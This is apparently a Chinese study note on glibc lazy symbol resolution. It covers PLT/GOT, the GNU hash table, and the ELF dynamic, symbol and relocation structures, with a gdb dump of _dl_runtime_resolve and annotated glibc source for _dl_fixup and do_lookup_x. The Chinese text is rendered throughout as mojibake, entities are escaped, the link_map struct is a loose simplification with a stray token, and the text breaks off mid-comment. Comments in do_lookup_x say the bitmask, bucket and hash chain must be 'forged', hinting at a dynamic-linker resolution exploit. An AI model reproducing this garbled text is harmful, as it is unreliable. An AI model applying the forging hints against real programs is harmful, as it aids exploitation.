å“ˆå¸Œå€¼æ•°ç»„ï¼šæ¯ä¸ªå“ˆå¸Œå€¼å 4å­—èŠ‚ã€‚ æŸ¥æ‰¾å‡½æ•°ç¬¦å·çœŸå®åœ°å€æµç¨‹ #\rè°ƒç”¨å¤§æ¦‚ #\rä» plt è¡¨è·³è½¬åˆ° got è¡¨\npush n/push ModuleIDï¼Œç„¶åè·³è½¬åˆ°_dl_runtime_resolve å‡½æ•°ã€‚\nä¸Šä¸€æ­¥å®é™…æ˜¯æ‰¾åˆ°ç¬¦å·çš„é‡å®šä½è¡¨æ¡ç›®ã€‚åœ¨é‡å®šä½è¡¨ä¸­ï¼Œåˆ†åˆ«è®°å½•äº†è§£æå¥½åœ°å€åéœ€è¦å›å¡«çš„åœ°å€ï¼Œå³ç¬¦å·çš„ got è¡¨åœ°å€ï¼ŒåŒæ—¶è®°å½•äº†ç¬¦å·æ‰€åœ¨çš„ç¬¦å·è¡¨çš„ä¸‹æ ‡ã€‚\nåŠ¨æ€é“¾æ¥å™¨è§£æç¬¦å·ï¼ˆå¦‚è°ƒç”¨exitï¼‰\nè®¡ç®—å“ˆå¸Œå€¼ï¼šå¯¹ç¬¦å·åï¼ˆå¦‚\u0026quot;exit\u0026quot;ï¼‰è®¡ç®—GNUå“ˆå¸Œå€¼ã€‚ å¸ƒéš†è¿‡æ»¤ï¼šæ£€æŸ¥å“ˆå¸Œå€¼æ˜¯å¦å¯èƒ½å­˜åœ¨äºå“ˆå¸Œè¡¨ä¸­ã€‚ å®šä½å“ˆå¸Œæ¡¶ï¼šæ ¹æ®å“ˆå¸Œå€¼æ‰¾åˆ°å¯¹åº”çš„å“ˆå¸Œæ¡¶ï¼ˆbucketï¼‰ã€‚ éå†å“ˆå¸Œé“¾ï¼š ä»æ¡¶ä¸­è·å–é“¾çš„èµ·å§‹ç´¢å¼• chain_indexã€‚ å®é™…ç¬¦å·ç´¢å¼• bucket = chain_index + symoffsetã€‚ symoffset æ˜¯ .dynsym ä¸­ç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·çš„ç´¢å¼•å€¼ã€‚ ä¾‹å¦‚ï¼Œè‹¥ .dynsym å‰5ä¸ªç¬¦å·æ˜¯å±€éƒ¨ç¬¦å·ï¼ˆç´¢å¼•0~4ï¼‰ï¼Œç¬¬6ä¸ªç¬¦å·ï¼ˆç´¢å¼•5ï¼‰æ˜¯ç¬¬ä¸€ä¸ªå…¨å±€ç¬¦å·ï¼Œåˆ™ symoffset = 5ã€‚ éå†å“ˆå¸Œé“¾ï¼ŒåŒ¹é…å“ˆå¸Œå€¼åï¼Œé€šè¿‡ç´¢å¼•åœ¨ .dynsym ä¸­æ‰¾åˆ°ç¬¦å·æ¡ç›®ã€‚ æ‰¾åˆ°ç¬¦å·ä¹‹åï¼Œè®¡ç®—å‡ºçœŸå®çš„åç§»ï¼Œç„¶åå¡«å›åˆ° got è¡¨ï¼Œé¿å…ä¸‹ä¸€æ¬¡é‡æ–°è§£æ\nè°ƒç”¨è¯¥å‡½æ•°\n.gnu.hashèŠ‚ä¸­çš„å“ˆå¸Œæ¡¶å’Œ .dynsym èŠ‚çš„å…³ç³» #\r.gnu.hash èŠ‚ .dynsym èŠ‚\r+-------------------+ +-------------------+\r| å“ˆå¸Œæ¡¶æ•°ç»„ | | Elf64_Sym[0] |\r| buckets[0]: 0 +--------------\u0026gt;| (å±€éƒ¨ç¬¦å·ï¼Œå¿½ç•¥) |\r| buckets[1]: 2 | +-------------------+\r| ... | | Elf64_Sym[1] |\r+-------------------+ | (å±€éƒ¨ç¬¦å·ï¼Œå¿½ç•¥) |\r+-------------------+\rå“ˆå¸Œé“¾æ•°ç»„index = bucket - symoffset | Elf64_Sym[bucket] |\r+-------------------+ | (å…¨å±€ç¬¦å·å¼€å§‹) |\r| hasharr[index]:0xABC | \u0026lt;---------|st_name: \u0026#34;exit\u0026#34; |\r| hasharr[index+1]:0xDEF| | st_value: 0x... |\r+-------------------+ +-------------------+ ç»†èŠ‚ #\ræ¶‰åŠçš„æ•°æ®ç»“æ„ #\r.dynamic å®é™…æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ å¯¹åº”çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ } d_un; } Elf64_Dyn; ç¬¦å·è¡¨çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Word st_name; // ç¬¦å·ååœ¨.dynsträ¸­çš„åç§» unsigned char st_info; // ç¬¦å·ç±»å‹ï¼ˆSTT_FUNCç­‰ï¼‰å’Œç»‘å®šå±æ€§ï¼ˆSTB_GLOBALç­‰ï¼‰ unsigned char st_other; Elf64_Section st_shndx; // ç¬¦å·æ‰€å±çš„èŠ‚åŒºç´¢å¼• Elf64_Addr st_value; // ç¬¦å·çš„åœ°å€ï¼ˆå¦‚å‡½æ•°åœ°å€ï¼‰ Elf64_Xword st_size; // ç¬¦å·å¤§å° } Elf64_Sym; é‡å®šä½è¡¨çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; link_mapçš„æ•°æ®ç»“æ„ï¼š\nstruct symtab_cache { // è¿™é‡Œå¯ä»¥åŒ…å«ç¼“å­˜ç›¸å…³çš„å…·ä½“æˆå‘˜ï¼Œå¦‚å“ˆå¸Œè¡¨ã€ç¼“å­˜æ¡ç›®ç­‰ // ç®€åŒ–ç¤ºä¾‹ä¸­æš‚ä¸è¯¦ç»†å±•å¼€ }; // è¡¨ç¤ºå·²æ‰¾åˆ°çš„ç‰ˆæœ¬ä¿¡æ¯ struct r_found_version { // è¿™é‡Œå¯ä»¥åŒ…å«ç‰ˆæœ¬ç›¸å…³çš„å…·ä½“æˆå‘˜ï¼Œå¦‚ç‰ˆæœ¬å·ã€ç‰ˆæœ¬æ ‡å¿—ç­‰ // ç®€åŒ–ç¤ºä¾‹ä¸­æš‚ä¸è¯¦ç»†å±•å¼€ }; // é“¾æ¥æ˜ å°„ç»“æ„ï¼Œä»£è¡¨ä¸€ä¸ªå·²åŠ è½½çš„å…±äº«å¯¹è±¡ struct link_map { // å…±äº«å¯¹è±¡åŠ è½½åˆ°å†…å­˜ä¸­çš„åŸºåœ°å€ // æ‰€æœ‰å…±äº«å¯¹è±¡å†…çš„ç›¸å¯¹åœ°å€éƒ½è¦åŠ ä¸Šè¿™ä¸ªåŸºåœ°å€æ‰æ˜¯å®é™…å†…å­˜åœ°å€ ElfW(Addr) l_addr; // æŒ‡å‘å…±äº«å¯¹è±¡çš„ç»å¯¹æ–‡ä»¶åçš„å­—ç¬¦ä¸²æŒ‡é’ˆ // ç”¨äºæ ‡è¯†è¯¥å…±äº«å¯¹è±¡æ˜¯ä»å“ªä¸ªæ–‡ä»¶åŠ è½½çš„ char *l_name; // æŒ‡å‘å…±äº«å¯¹è±¡çš„åŠ¨æ€èŠ‚ï¼ˆ.dynamic èŠ‚ï¼‰çš„æŒ‡é’ˆ // åŠ¨æ€èŠ‚åŒ…å«äº†å…±äº«å¯¹è±¡åŠ¨æ€é“¾æ¥ç›¸å…³çš„é‡è¦ä¿¡æ¯ï¼Œå¦‚ç¬¦å·è¡¨ã€é‡å®šä½è¡¨ä½ç½®ç­‰ ElfW(Dyn) *l_ld; // æŒ‡å‘ä¸‹ä¸€ä¸ªåŠ è½½çš„å…±äº«å¯¹è±¡çš„ link_map æŒ‡é’ˆ // ç”¨äºå°†æ‰€æœ‰å·²åŠ è½½çš„å…±äº«å¯¹è±¡è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨ struct link_map *l_next; // æŒ‡å‘å‰ä¸€ä¸ªåŠ è½½çš„å…±äº«å¯¹è±¡çš„ link_map æŒ‡é’ˆ // ç”¨äºå°†æ‰€æœ‰å·²åŠ è½½çš„å…±äº«å¯¹è±¡è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨ struct link_map *l_prev; // æœ¬åœ°ç¬¦å·æŸ¥æ‰¾çš„ç¼“å­˜æŒ‡é’ˆ // å¯ä»¥æé«˜æœ¬åœ°ç¬¦å·æŸ¥æ‰¾çš„æ•ˆç‡ï¼Œå‡å°‘éå†ç¬¦å·è¡¨çš„æ¬¡æ•° struct symtab_cache *l_local_cache; // å…¨å±€ç¬¦å·æŸ¥æ‰¾çš„ç¼“å­˜æŒ‡é’ˆ // å¯ä»¥æé«˜å…¨å±€ç¬¦å·æŸ¥æ‰¾çš„æ•ˆç‡ï¼Œå‡å°‘éå†ç¬¦å·è¡¨çš„æ¬¡æ•° struct symtab_cache *l_global_cache; l_gnu_chain_zero // åªè¯»é‡å®šä½ï¼ˆRELROï¼‰æ®µçš„èµ·å§‹åœ°å€ // RELRO æ®µåŒ…å«ç¨‹åºåŠ è½½æ—¶å·²å®Œæˆé‡å®šä½çš„åªè¯»æ•°æ®ï¼Œæœ‰åŠ©äºæé«˜ç¨‹åºå®‰å…¨æ€§ ElfW(Addr) l_relro_addr; // åªè¯»é‡å®šä½ï¼ˆRELROï¼‰æ®µçš„å¤§å° ElfW(Addr) l_relro_size; // å…±äº«å¯¹è±¡åˆå§‹åŒ–å‡½æ•°çš„åœ°å€ // åœ¨å…±äº«å¯¹è±¡åŠ è½½åï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œåˆå§‹åŒ–æ“ä½œ ElfW(Addr) l_init; // å…±äº«å¯¹è±¡ç»ˆæ­¢å‡½æ•°çš„åœ°å€ // åœ¨å…±äº«å¯¹è±¡å¸è½½å‰ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè°ƒç”¨æ­¤å‡½æ•°è¿›è¡Œæ¸…ç†æ“ä½œ ElfW(Addr) l_fini; // æŒ‡å‘å®é™…çš„ link_map // åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ä»£ç†æˆ–è™šæ‹Ÿçš„ link_mapï¼Œl_real æŒ‡å‘çœŸæ­£çš„å…±äº«å¯¹è±¡ä¿¡æ¯ struct link_map *l_real; // å…±äº«å¯¹è±¡çš„ç±»å‹ï¼Œå¦‚å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ç­‰ // å¯ä»¥é€šè¿‡ä¸åŒçš„å€¼æ¥åŒºåˆ†ä¸åŒç±»å‹çš„åŠ è½½å¯¹è±¡ int l_type; ... ... }; ç»†èŠ‚æµç¨‹ #\r1.è·³è½¬åˆ°_dl_runtime_resolveå‡½æ•°åï¼Œä¿å­˜å„ä¸ªå¯„å­˜å™¨æ•°æ®ï¼Œç„¶åcall _dl_fixup è¿™ä¸ªå‡½æ•°ï¼Œè·å–åˆ°çœŸå®çš„åœ°å€ï¼ŒæŠŠåœ°å€ä¿å­˜åœ¨ r11 å¯„å­˜å™¨ä¸­ï¼ŒæŠŠç›¸å…³æ•°æ®æ¢å¤åï¼Œç›´æ¥ jmp r11ã€‚\nDump of assembler code for function _dl_runtime_resolve_xsavec: 0x00007ffff7fe7bc0 \u0026lt;+0\u0026gt;:\tendbr64 0x00007ffff7fe7bc4 \u0026lt;+4\u0026gt;:\tpush rbx 0x00007ffff7fe7bc5 \u0026lt;+5\u0026gt;:\tmov rbx,rsp 0x00007ffff7fe7bc8 \u0026lt;+8\u0026gt;:\tand rsp,0xffffffffffffffc0 0x00007ffff7fe7bcc \u0026lt;+12\u0026gt;:\tsub rsp,QWORD PTR [rip+0x14b35] # 0x7ffff7ffc708 \u0026lt;_rtld_global_ro+232\u0026gt; 0x00007ffff7fe7bd3 \u0026lt;+19\u0026gt;:\tmov QWORD PTR [rsp],rax 0x00007ffff7fe7bd7 \u0026lt;+23\u0026gt;:\tmov QWORD PTR [rsp+0x8],rcx 0x00007ffff7fe7bdc \u0026lt;+28\u0026gt;:\tmov QWORD PTR [rsp+0x10],rdx 0x00007ffff7fe7be1 \u0026lt;+33\u0026gt;:\tmov QWORD PTR [rsp+0x18],rsi 0x00007ffff7fe7be6 \u0026lt;+38\u0026gt;:\tmov QWORD PTR [rsp+0x20],rdi 0x00007ffff7fe7beb \u0026lt;+43\u0026gt;:\tmov QWORD PTR [rsp+0x28],r8 0x00007ffff7fe7bf0 \u0026lt;+48\u0026gt;:\tmov QWORD PTR [rsp+0x30],r9 0x00007ffff7fe7bf5 \u0026lt;+53\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7bfa \u0026lt;+58\u0026gt;:\txor edx,edx 0x00007ffff7fe7bfc \u0026lt;+60\u0026gt;:\tmov QWORD PTR [rsp+0x250],rdx 0x00007ffff7fe7c04 \u0026lt;+68\u0026gt;:\tmov QWORD PTR [rsp+0x258],rdx 0x00007ffff7fe7c0c \u0026lt;+76\u0026gt;:\tmov QWORD PTR [rsp+0x260],rdx 0x00007ffff7fe7c14 \u0026lt;+84\u0026gt;:\tmov QWORD PTR [rsp+0x268],rdx 0x00007ffff7fe7c1c \u0026lt;+92\u0026gt;:\tmov QWORD PTR [rsp+0x270],rdx 0x00007ffff7fe7c24 \u0026lt;+100\u0026gt;:\tmov QWORD PTR [rsp+0x278],rdx 0x00007ffff7fe7c2c \u0026lt;+108\u0026gt;:\txsavec [rsp+0x40] 0x00007ffff7fe7c31 \u0026lt;+113\u0026gt;:\tmov rsi,QWORD PTR [rbx+0x10] 0x00007ffff7fe7c35 \u0026lt;+117\u0026gt;:\tmov rdi,QWORD PTR [rbx+0x8] =\u0026gt; 0x00007ffff7fe7c39 \u0026lt;+121\u0026gt;:\tcall 0x7ffff7fe00c0 \u0026lt;_dl_fixup\u0026gt; 0x00007ffff7fe7c3e \u0026lt;+126\u0026gt;:\tmov r11,rax 0x00007ffff7fe7c41 \u0026lt;+129\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7c46 \u0026lt;+134\u0026gt;:\txor edx,edx 0x00007ffff7fe7c48 \u0026lt;+136\u0026gt;:\txrstor [rsp+0x40] 0x00007ffff7fe7c4d \u0026lt;+141\u0026gt;:\tmov r9,QWORD PTR [rsp+0x30] 0x00007ffff7fe7c52 \u0026lt;+146\u0026gt;:\tmov r8,QWORD PTR [rsp+0x28] 0x00007ffff7fe7c57 \u0026lt;+151\u0026gt;:\tmov rdi,QWORD PTR [rsp+0x20] 0x00007ffff7fe7c5c \u0026lt;+156\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x18] 0x00007ffff7fe7c61 \u0026lt;+161\u0026gt;:\tmov rdx,QWORD PTR [rsp+0x10] 0x00007ffff7fe7c66 \u0026lt;+166\u0026gt;:\tmov rcx,QWORD PTR [rsp+0x8] 0x00007ffff7fe7c6b \u0026lt;+171\u0026gt;:\tmov rax,QWORD PTR [rsp] 0x00007ffff7fe7c6f \u0026lt;+175\u0026gt;:\tmov rsp,rbx 0x00007ffff7fe7c72 \u0026lt;+178\u0026gt;:\tmov rbx,QWORD PTR [rsp] 0x00007ffff7fe7c76 \u0026lt;+182\u0026gt;:\tadd rsp,0x18 0x00007ffff7fe7c7a \u0026lt;+186\u0026gt;:\tbnd jmp r11 End of assembler dump. _dl_fixupå‡½æ•°ï¼š\nDL_FIXUP_VALUE_TYPE attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE _dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg) { // è¿™é‡Œçš„læ˜¯äºŒè¿›åˆ¶ç¨‹åºæœ¬èº«çš„link_mapï¼Œè€Œä¸æ˜¯soçš„ // ç¬¬äºŒä¸ªå‚æ•°å³ä¸ºpush nï¼Œæ‰€æŸ¥æ‰¾çš„ç¬¦å·åœ¨é‡å®šä½è¡¨.rel.pltä¸­çš„ç´¢å¼• // é¦–å…ˆæ ¹æ®link_mapä¸­è®°å½•çš„ä¿¡æ¯ï¼Œæ‰¾åˆ°åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); // æ‰¾åˆ°å¯¹åº”çš„é‡å®šä½å…ƒç´ ã€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸² const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = \u0026amp;symtab[ELFW(R_SYM) (reloc-\u0026gt;r_info)]; const ElfW(Sym) *refsym = sym; // rel_addr å³ä¸ºgotè¡¨çš„åœ°å€ï¼Œåœ¨æŸ¥æ‰¾åˆ°ç¬¦å·çœŸå®åœ°å€ä¹‹åä¼šå›å¡«åˆ°è¿™ä¸ªåœ°å€ä¸­ void *const rel_addr = (void *)(l-\u0026gt;l_addr + reloc-\u0026gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we\u0026#39;re really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-\u0026gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don\u0026#39;t look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-\u0026gt;st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l-\u0026gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) { const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-\u0026gt;r_info)] \u0026amp; 0x7fff; version = \u0026amp;l-\u0026gt;l_versions[ndx]; if (version-\u0026gt;hash == 0) version = NULL; } /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) { THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; } #ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL; #endif // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²åœ°å€ï¼Œæ ¹æ®ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨å¾—åˆ°çš„ // ç¬¬äºŒä¸ªå‚æ•°æ˜¯link_map // ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç¬¦å·è¡¨çš„åœ°å€ï¼Œæ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œæœ€åä¼šä¿®æ­£å¾—åˆ°çš„ç¬¦å·è¡¨ // ç¬¬å››ä¸ªå‚æ•°æ˜¯scopeï¼Œè¡¨ç¤ºæŸ¥æ‰¾çš„èŒƒå›´ // ç¬¬äº”ä¸ªå‚æ•°æ˜¯ç‰ˆæœ¬ä¿¡æ¯ // åé¢çš„å‚æ•°éƒ½æ˜¯å›ºå®šçš„ result = _dl_lookup_symbol_x (strtab + sym-\u0026gt;st_name, l, \u0026amp;sym, l-\u0026gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */ value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); } else { /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; } /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL \u0026amp;\u0026amp; __builtin_expect (ELFW(ST_TYPE) (sym-\u0026gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; // ä¿®æ­£gotè¡¨æ¡ç›® return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); } 3.è°ƒç”¨_dl_lookup_symbol_x å‡½æ•° åœ¨å„ä¸ªsoçš„link_mapå¯»æ‰¾å¯¹åº”ç¬¦å·,ä½†æ˜¯å®é™…è°ƒç”¨do_lookup_xå‡½æ•°\nCstatic int __attribute_noinline__ do_lookup_x (const char *undef_name, uint_fast32_t new_hash, unsigned long int *old_hash, const ElfW(Sym) *ref, struct sym_val *result, struct r_scope_elem *scope, size_t i, const struct r_found_version *const version, int flags, struct link_map *skip, int type_class, struct link_map *undef_map) { size_t n = scope-\u0026gt;r_nlist; //r_nlistæ˜¯åŠ¨æ€åº“link_mapçš„æ•°é‡ï¼Œæ¯ä¸ªåŠ¨æ€åº“éƒ½æœ‰ä¸€ä¸ªlink_map /* Make sure we read the value before proceeding. Otherwise we might use r_list pointing to the initial scope and r_nlist being the value after a resize. That is the only path in dl-open.c not protected by GSCOPE. A read barrier here might be to expensive. */ __asm volatile (\u0026#34;\u0026#34; : \u0026#34;+r\u0026#34; (n), \u0026#34;+m\u0026#34; (scope-\u0026gt;r_list)); struct link_map **list = scope-\u0026gt;r_list;//å­˜æ”¾æ¯ä¸ªlink_mapçš„åœ°å€æ•°ç»„ do { const struct link_map *map = list[i]-\u0026gt;l_real; //l_real æ˜¯ struct link_map ç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæˆå‘˜ï¼Œé€šå¸¸æŒ‡å‘è¯¥åŠ¨æ€é“¾æ¥åº“å®é™…å¯¹åº”çš„ link_mapã€‚ /* Here come the extra test needed for `_dl_lookup_symbol_skip\u0026#39;. */ if (map == skip) continue; /* Don\u0026#39;t search the executable when resolving a copy reloc. */ if ((type_class \u0026amp; ELF_RTYPE_CLASS_COPY) \u0026amp;\u0026amp; map-\u0026gt;l_type == lt_executable) continue; /* Do not look into objects which are going to be removed. */ if (map-\u0026gt;l_removed) continue; /* Print some debugging info if wanted. */ if (__glibc_unlikely (GLRO(dl_debug_mask) \u0026amp; DL_DEBUG_SYMBOLS)) _dl_debug_printf (\u0026#34;symbol=%s; lookup in file=%s [%lu]\\n\u0026#34;, undef_name, DSO_FILENAME (map-\u0026gt;l_name), map-\u0026gt;l_ns); /* If the hash table is empty there is nothing to do here. */ if (map-\u0026gt;l_nbuckets == 0) continue; Elf_Symndx symidx; int num_versions = 0; const ElfW(Sym) *versioned_sym = NULL; /* The tables for this map. */ // æ‰¾åˆ°ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ï¼ˆå½“å‰link_mapï¼‰ const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]); const ElfW(Sym) *sym; // è·å–bitmask const ElfW(Addr) *bitmask = map-\u0026gt;l_gnu_bitmask; if (__glibc_likely (bitmask != NULL)) { // è·å–bitmask_wordï¼Œè¿™é‡Œéœ€è¦ä¼ªé€ ï¼Œ//bitmask_wordç”¨æ¥åˆ¤æ–­new_hashæ˜¯å¦å“ˆå¸Œè¡¨ä¸­ // new_hashçš„è®¡ç®—ï¼šint_fast32_t new_hash = _dl_elf_hash (undef_name); // undef_name ç¬¦å·åç§°ã€‚ ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) \u0026amp; map-\u0026gt;l_gnu_bitmask_idxbits]; unsigned int hashbit1 = new_hash \u0026amp; (__ELF_NATIVE_CLASS - 1); unsigned int hashbit2 = ((new_hash \u0026gt;\u0026gt; map-\u0026gt;l_gnu_shift) \u0026amp; (__ELF_NATIVE_CLASS - 1)); if (__glibc_unlikely ((bitmask_word \u0026gt;\u0026gt; hashbit1) \u0026amp; (bitmask_word \u0026gt;\u0026gt; hashbit2) \u0026amp; 1)) { // è·å–bucketï¼Œè¿™é‡Œéœ€è¦ä¼ªé€  // è·å–ç¬¦å·æ‰€åœ¨çš„æ¡¶ï¼ˆbucketï¼‰ // map-\u0026gt;l_gnu_buckets æ˜¯ GNU å“ˆå¸Œè¡¨çš„æ¡¶æ•°ç»„ // new_hash % map-\u0026gt;l_nbuckets è®¡ç®—å‡ºç¬¦å·åœ¨æ¡¶æ•°ç»„ä¸­çš„ç´¢å¼• // å°†è¯¥ç´¢å¼•å¯¹åº”çš„æ¡¶çš„å€¼èµ‹ç»™ bucket // è¿™é‡Œä»£ç æ³¨é‡Šæåˆ°éœ€è¦ä¼ªé€ ï¼Œå¯èƒ½æ˜¯åœ¨æŸäº›ç‰¹æ®Šè°ƒè¯•æˆ–æ¨¡æ‹Ÿåœºæ™¯ä¸‹çš„æƒ…å†µ Elf32_Word bucket = map-\u0026gt;l_gnu_buckets[new_hash % map-\u0026gt;l_nbuckets]; if (bucket != 0) { // hasharrï¼Œè¿™é‡Œä¹Ÿéœ€è¦ä¼ªé€ å¯¹åº”çš„å€¼ // è¿™é‡Œæ³¨é‡Šæåˆ° hasharr éœ€è¦ä¼ªé€ å¯¹åº”çš„å€¼ï¼Œå¯èƒ½æ˜¯åœ¨æŸäº›ç‰¹æ®Šè°ƒè¯•æˆ–æ¨¡æ‹Ÿåœºæ™¯ä¸‹çš„æƒ…å†µ // ä» GNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„ä¸­è·å–å½“å‰æ¡¶å¯¹åº”çš„èµ·å§‹ä½ç½® // map-\u0026gt;l_gnu_chain_zero æ˜¯ GNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„èµ·å§‹åœ°å€ // bucket æ˜¯å‰é¢è®¡ç®—å¾—åˆ°çš„ç¬¦å·æ‰€åœ¨çš„æ¡¶çš„ç´¢å¼• // é€šè¿‡ \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket] è·å–è¯¥æ¡¶å¯¹åº”çš„é“¾çš„èµ·å§‹æŒ‡é’ˆ const Elf32_Word *hasharr = \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket]; // ä½¿ç”¨ do-while å¾ªç¯éå†å½“å‰æ¡¶å¯¹åº”çš„é“¾ï¼ŒæŸ¥æ‰¾åŒ¹é…çš„ç¬¦å· do if (((*hasharr ^ new_hash) \u0026gt;\u0026gt; 1) == 0) // æ ¹æ®å½“å‰é“¾èŠ‚ç‚¹çš„ä¿¡æ¯è®¡ç®—ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ç´¢å¼• // ELF_MACHINE_HASH_SYMIDX æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºæ ¹æ®ä¸åŒçš„ ELF æœºå™¨ç±»å‹è®¡ç®—ç¬¦å·ç´¢å¼• // map æ˜¯å½“å‰å…±äº«å¯¹è±¡çš„ link_map ç»“æ„ä½“æŒ‡é’ˆ // hasharr æ˜¯å½“å‰é“¾èŠ‚ç‚¹çš„æŒ‡é’ˆ symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr); // è°ƒç”¨ check_match å‡½æ•°æ£€æŸ¥å½“å‰ç¬¦å·æ˜¯å¦çœŸæ­£åŒ¹é…è¦æŸ¥æ‰¾çš„ç¬¦å· // undef_name æ˜¯è¦æŸ¥æ‰¾çš„æœªå®šä¹‰ç¬¦å·çš„åç§° // ref æ˜¯å¼•ç”¨ç¬¦å·çš„ç¬¦å·è¡¨é¡¹æŒ‡é’ˆ // version ç”¨äºå­˜å‚¨æ‰¾åˆ°çš„ç¬¦å·çš„ç‰ˆæœ¬ä¿¡æ¯ // flags æ˜¯æŸ¥æ‰¾æ ‡å¿—ï¼Œæ§åˆ¶æŸ¥æ‰¾çš„è¡Œä¸º // type_class æ˜¯ç¬¦å·ç±»å‹ç±»åˆ« // \u0026amp;symtab[symidx] æ˜¯å½“å‰å¯èƒ½åŒ¹é…çš„ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„é¡¹ // symidx æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„ç´¢å¼• // strtab æ˜¯å­—ç¬¦ä¸²è¡¨æŒ‡é’ˆï¼Œç”¨äºè·å–ç¬¦å·åç§° // map æ˜¯å½“å‰å…±äº«å¯¹è±¡çš„ link_map ç»“æ„ä½“æŒ‡é’ˆ // \u0026amp;versioned_sym ç”¨äºå­˜å‚¨ç‰ˆæœ¬åŒ–ç¬¦å·çš„ä¿¡æ¯ // \u0026amp;num_versions ç”¨äºå­˜å‚¨ç‰ˆæœ¬æ•°é‡ä¿¡æ¯ sym = check_match (undef_name, ref, version, flags, type_class, \u0026amp;symtab[symidx], symidx, strtab, map, \u0026amp;versioned_sym, \u0026amp;num_versions); // å¦‚æœ check_match å‡½æ•°è¿”å›éç©ºæŒ‡é’ˆï¼Œè¯´æ˜æ‰¾åˆ°äº†åŒ¹é…çš„ç¬¦å· if (sym != NULL) { // è·³è½¬åˆ° found_it æ ‡ç­¾å¤„ï¼Œè¿›è¡Œåç»­å¤„ç† goto found_it; } } // ç§»åŠ¨åˆ°é“¾ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ // (*hasharr++ \u0026amp; 1u) ç”¨äºæ£€æŸ¥å½“å‰é“¾èŠ‚ç‚¹æ˜¯å¦æ˜¯é“¾ä¸­çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ // å¦‚æœæœ€åä¸€ä½ä¸º 